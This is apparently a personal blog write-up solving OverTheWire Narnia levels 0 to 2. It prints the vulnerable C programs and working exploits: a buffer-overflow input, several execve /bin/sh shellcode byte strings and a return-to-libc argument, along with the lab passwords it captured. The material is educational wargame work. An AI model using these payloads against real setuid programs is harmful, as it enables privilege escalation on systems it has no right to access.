## OverTheWire: Narnia
After the frusration and lack of success in the Oman Quals CTF, I've decided to redirect my attention to some of the OverTheWire challenges. I've already completed both the Bandit and Leviathon series of challenges, but will not be doing write-ups on those due to the amount of resources already out there.

### Narnia0
After logging in with the username and password `narnia0` and reading the Welcome banner. It is discovered that the passwords for each level are stored in /etc/narnia_pass/narniaX and the programs to be exploited are in /narnia/ (as well as the source code for said programs).

After looking at the code for narnia0.c, we can see that we need the 'val' variable to be equal to 0xdeadbeef which can be done with a buffer overflow since the 'buf' variable that is read-in from user input is just before the val variable on the stack. Also, because the executable narnia0 has the setuid bit set (s in the owner execute spot in a long listing) the shell that is run in the program will have the privileges of the owner, i.e. narnia1, and allow us to view that users password file.

```
int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

By entering `(python -c 'print "A"*20 + "\xef\xbe\xad\xde"*10')` and piping it into the file we don't get the "WAY OFF!!!!" that we normally would but we also don't get the shell that we expect. So we know it works (kind of) but why are we using those commands. Well '-c' is used to tell python that the following information will be command-line input. Then the 20 A's are used to take up the space in the 'buf' variable and finally we have the 0xdeadbeef in reverse byte-order to account for how the bytes are stored in memory (most PCs are little-endian, i.e. the byte with the littlest value is stored first, this can be checked with the command `lscpu | grep "Byte Order"`).

Now we just have to add something to leave the input open after our code is run (after some research, I found the best way to do this was via the `cat` command).

So the full series of commands is as follows:
```
narnia0@narnia:~$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ▒
val: 0xdeadbeef
whoami
narnia1
```
And we can use this to find our flag:
```
cat /etc/narnia_pass/narnia1
efeidiedae
```

### Narnia1
At first, I thought this one would be easier than the previous challenge. As you can see from the code below, the program attempts to execute code located at the EGG environment variable. Environment Variables are globally accessable variablesfor sharing information between different applications and processes (they can be viewed by entering the `env` command). Since this program runs as Narnia2 (it has a higher privelege as in the last challenge), we want to get the program to open a shell so we can view the Narnia2 password.

```
int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

I initially attempted to simply set $EGG to '/bin/sh' (the $ symbol is used when accessing a global variable). I ran the program and got: `Trying to execute EGG! Segmentation fault`, so that didn't work. It's just displaying the string instead of executing the code and opening the shell. What we need is shellcode!

Shellcode is made up of commands used as the payload for exploitation, named so because of its ability to open a command shell. My first attempt was using the shellcode from **Hacking: The Art of Exploitation** but this attempt didn't work either. After some research, I discovered that my problem was due to the fact that shellcode must be tailored to the machine it is running on. To check our target system, we enter `lscpu`. From here we discover the following:
```
Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                2
On-line CPU(s) list:   0,1
Thread(s) per core:    1
Core(s) per socket:    2
Socket(s):             1
Vendor ID:             GenuineIntel
CPU family:            15
Model:                 6
Model name:            Common KVM processor
Stepping:              1
CPU MHz:               3074.244
BogoMIPS:              6148.48
Hypervisor vendor:     KVM
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              4096K
L3 cache:              16384K
```

We can see that our target computer is being run on a Virtual Machine, is 64-bit, and has an Intel processor (and we already know it's running Linux due to it's file system). So after searching for Linux x86_64 shellcode, I found some and placed it in the EGG variable.
```
narnia1@narnia:~$ export EGG=$(echo -en "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
narnia1@narnia:~$ echo $EGG
1▒H▒ѝ▒▒Ќ▒▒H▒▒ST_▒RWT^▒;
narnia1@narnia:~$ /narnia/narnia1
Trying to execute EGG!
Segmentation fault
```
That didn't work, so I tried with some different shellcode, and then I tried again, and again, and again...
```
narnia1@narnia:~$ export EGG=$(echo -en "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05")
narnia1@narnia:~$ /narnia/narnia1
Trying to execute EGG!
Illegal instruction
narnia1@narnia:~$ export EGG=$(echo -en "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")
narnia1@narnia:~$ /narnia/narnia1
Trying to execute EGG!
Segmentation fault
narnia1@narnia:~$ export EGG=$(echo -en "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05")
narnia1@narnia:~$ /narnia/narnia1
Trying to execute EGG!
narnia1@narnia:~$ export EGG=$(echo -en "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43")
narnia1@narnia:~$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```
...until I finally got it. Whew! That took a lot longer than expected.

I hope this helped to explain some basic computer exploitation principles in regards to environment variables. As for shellcode, I'll do some reading up on that and provide some better explanations in the future.

### Narnia2
**TBD**

```
narnia2@narnia:~$ /narnia/narnia2 $(python -c 'print "A"*132+"\x50\xc8\xe4\xf7\x10\x10\xe1\xf7\xc8\xec\xf6\xf7"')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee
```
